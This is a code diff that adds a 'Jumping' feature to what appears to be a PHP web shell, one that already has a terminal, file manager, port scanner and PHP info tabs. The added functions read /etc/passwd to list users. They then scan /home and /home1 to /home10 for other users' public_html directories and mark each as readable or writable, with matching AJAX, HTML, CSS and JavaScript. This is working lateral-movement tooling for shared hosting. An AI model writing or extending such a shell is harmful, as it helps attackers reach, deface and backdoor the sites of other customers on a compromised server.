@@ -808,6 +808,104 @@ function formatSizeUnits($bytes) {
     return @round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
 }
 
+// --- NEW: Jumping Feature Functions ---
+
+/**
+ * Gets a list of usernames from /etc/passwd on Linux systems.
+ * This is part of the "Jumping" feature.
+ *
+ * @return array An array of usernames or an array with an error message.
+ */
+function getJumpingUsernames() {
+    $passwd_file = '/etc/passwd';
+    // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
+    $usernames = array();
+
+    if (@is_readable($passwd_file)) {
+        $lines = @file($passwd_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        if ($lines === false) {
+            return array('error' => 'Failed to read /etc/passwd (file error)');
+        }
+
+        foreach ($lines as $line) {
+            $parts = explode(':', $line);
+            if (count($parts) >= 6) {
+                $username = $parts[0];
+                $home_dir = $parts[5];
+                // Only include users with home directories like /home*/*
+                if (preg_match('#^/home[0-9]*/#', $home_dir) || $home_dir === '/home') {
+                    $usernames[] = $username;
+                }
+            }
+        }
+    } else {
+        return array('error' => 'Cannot access /etc/passwd (Permission denied)');
+    }
+
+    return $usernames;
+}
+
+/**
+ * Scans for readable/writable public_html directories for all users.
+ * This is the core logic for the "Jumping" feature.
+ *
+ * @return string The HTML formatted result of the scan.
+ */
+function scanJumpingDirectories() {
+    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+        return '<span class="jumping-error">This feature is only available on Linux servers.</span>';
+    }
+
+    $usernames = getJumpingUsernames();
+    // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
+    $basePaths = array('/home');
+    // Check for /home1, /home2, etc.
+    for ($i = 1; $i <= 10; $i++) {
+        if(is_dir("/home$i")) {
+            $basePaths[] = "/home$i";
+        }
+    }
+    
+    $results_html = '';
+    $found_items = false;
+
+    if (isset($usernames['error'])) {
+        $results_html .= '<span class="jumping-error">Error: ' . htmlspecialchars($usernames['error']) . '</span><br>';
+    } else {
+        foreach ($basePaths as $basePath) {
+            foreach ($usernames as $username) {
+                $publicHtmlPath = "$basePath/$username/public_html";
+                // Check if directory exists
+                if (@is_dir($publicHtmlPath)) {
+                    $isReadable = @is_readable($publicHtmlPath);
+                    $isWritable = @is_writable($publicHtmlPath);
+
+                    if ($isReadable || $isWritable) {
+                        $found_items = true;
+                        $status = '';
+                        $class = '';
+                        if ($isWritable) {
+                            $status = '[WR]';
+                            $class = 'jumping-writable';
+                        } elseif ($isReadable) {
+                            $status = '[R]';
+                            $class = 'jumping-readable';
+                        }
+                        $results_html .= "<span class=\"$class\">" . htmlspecialchars($status . ' ' . $publicHtmlPath) . "</span><br>";
+                    }
+                }
+            }
+        }
+    }
+
+    if (!$found_items && !isset($usernames['error'])) {
+        $results_html = "No readable or writable public_html directories found.<br>";
+    }
+    
+    return $results_html;
+}
+
+
 if ($authenticated && isset($_POST['ajax_action'])) {
     if (isset($_SESSION['terminal_cwd']) && is_dir($_SESSION['terminal_cwd'])) {
         if(!@chdir($_SESSION['terminal_cwd'])) {
@@ -1380,6 +1478,12 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             $response = array('status' => 'success', 'output' => $output);
             break;
         
+        // --- NEW: Jumping Feature AJAX Action ---
+        case 'jumping_scan':
+            $scan_results = scanJumpingDirectories();
+            $response = array('status' => 'success', 'output' => $scan_results);
+            break;
+
         default:
              $response['message'] = 'Unknown AJAX action: ' . htmlspecialchars($_POST['ajax_action']);
              break;
@@ -1517,7 +1621,7 @@ endif;
         .modal-message.success { background-color: #050; color: #0f0; border: 1px solid #0a0;}
         .modal-message.error { background-color: #500; color: #f00; border: 1px solid #a00;}
         select.inputz { width: auto; min-width: 218px;}
-        /* --- NEW: Upload Progress Bar Styles --- */
+        /* --- Upload Progress Bar Styles --- */
         #upload-progress-container { width: 100%; max-height: 400px; overflow-y: auto; padding-right: 10px; }
         .upload-progress-item { margin-bottom: 15px; }
         .upload-progress-item .filename { word-break: break-all; font-size: 0.9em; margin-bottom: 5px; }
@@ -1525,6 +1629,12 @@ endif;
         .upload-progress-bar { background-color: #0ff; height: 15px; border-radius: 3px; width: 0%; transition: width 0.2s ease-out; }
         .upload-progress-info { font-size: 0.8em; margin-top: 3px; display: flex; justify-content: space-between; }
         .upload-progress-info .status { color: #0cc; }
+        /* --- NEW: Jumping Tab Styles --- */
+        #jumping-results { background: #000; color: #fff; padding: 15px; min-height: 200px; max-height: 350px; overflow-y: scroll; border: 1px solid #055; margin-top: 20px; white-space: pre-wrap; font-family: 'Consolas', 'Monaco', monospace; font-size: 0.9em; border-radius: 5px; }
+        #jumping-results:empty::before { content: "Scan results will appear here..."; color: #555; }
+        .jumping-writable { color: #00ff00; } /* Bright green for writable */
+        .jumping-readable { color: #ffffff; } /* White for readable */
+        .jumping-error { color: #ff4444; } /* Red for errors */
     </style>
 </head>
 <body>
@@ -1539,6 +1649,7 @@ endif;
         <div class="tabs">
             <span class="tab-link active" data-tab="terminal">Terminal</span>
             <span class="tab-link" data-tab="filemanager">File Manager</span>
+            <span class="tab-link" data-tab="jumping">Jumping</span>
             <span class="tab-link" data-tab="serverinfo">Server Info</span>
             <span class="tab-link" data-tab="network">Network Tools</span>
             <span class="tab-link" data-tab="phpinfo" id="phpinfo-tab-button">PHP Info</span>
@@ -1597,6 +1708,16 @@ endif;
                     </div>
                 </div>
             </div>
+        </div>
+
+        <!-- === NEW: Jumping Tab Content === -->
+        <div id="jumping" class="tab-content">
+            <h2>Jumping - Permissions Scanner</h2>
+            <p>This tool scans for misconfigured `public_html` directories of other users on the server. It checks for readable and writable paths. This feature is intended for Linux servers only.</p>
+            <div class="button-bar">
+                <button id="start-jumping-scan-btn" class="inputzbut">Start Scan</button>
+            </div>
+            <div id="jumping-results"></div>
         </div>
 
         <div id="serverinfo" class="tab-content">
@@ -1733,6 +1854,8 @@ document.addEventListener('DOMContentLoaded', function() {
     const uploadModal = document.getElementById('upload-modal');
     const uploadProgressContainer = document.getElementById('upload-progress-container');
     const closeUploadModalBtn = document.getElementById('close-upload-modal-btn');
+    const startJumpingScanBtn = document.getElementById('start-jumping-scan-btn');
+    const jumpingResultsDiv = document.getElementById('jumping-results');
     
     // --- State Variables ---
     const scriptHomeDirectory = '<?php echo addslashes(htmlspecialchars(getcwd())); ?>';
@@ -2302,6 +2425,20 @@ document.addEventListener('DOMContentLoaded', function() {
         e.preventDefault(); const data = { host: e.target.elements['scan_host'].value, scan_ports: e.target.elements['scan_ports'].value };
         sendNetworkRequest(e.target.id, 'port_scan', data);
     });
+
+    // --- NEW: Jumping Feature Logic ---
+    startJumpingScanBtn.addEventListener('click', async () => {
+        jumpingResultsDiv.innerHTML = 'Scanning... <i class="fas fa-spinner fa-spin"></i>';
+        startJumpingScanBtn.disabled = true;
+        const result = await sendAjaxRequest('jumping_scan');
+        if (result.status === 'success') {
+            jumpingResultsDiv.innerHTML = result.output;
+        } else {
+            jumpingResultsDiv.innerHTML = `<span class="jumping-error">${htmlEntities(result.message || 'An unknown error occurred.')}</span>`;
+        }
+        startJumpingScanBtn.disabled = false;
+    });
+
 
     // Initial Load
     if (document.getElementById('filemanager').classList.contains('active')) {
